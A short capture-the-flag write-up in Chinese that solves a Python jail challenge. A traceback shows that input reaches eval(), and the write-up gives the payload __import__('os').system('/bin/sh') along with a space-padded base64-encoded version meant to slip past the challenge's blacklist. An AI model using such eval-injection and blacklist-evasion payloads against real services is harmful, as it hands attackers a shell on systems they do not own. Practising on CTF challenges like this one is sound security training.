#解法
嘗試隨意輸入
'''
>>> aa
Traceback (most recent call last):
  File "jail1.py", line 49, in <module>
    data = eval(data)
  File "<string>", line 1, in <module>
NameError: name 'aa' is not defined
'''
發現是eval，變可以嘗試躲過黑名單輸入
`__import__('os').system('/bin/sh')`
躲過 = 可以直接補空白
"X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJy9iaW4vc2gnKSAg".decode('base64')
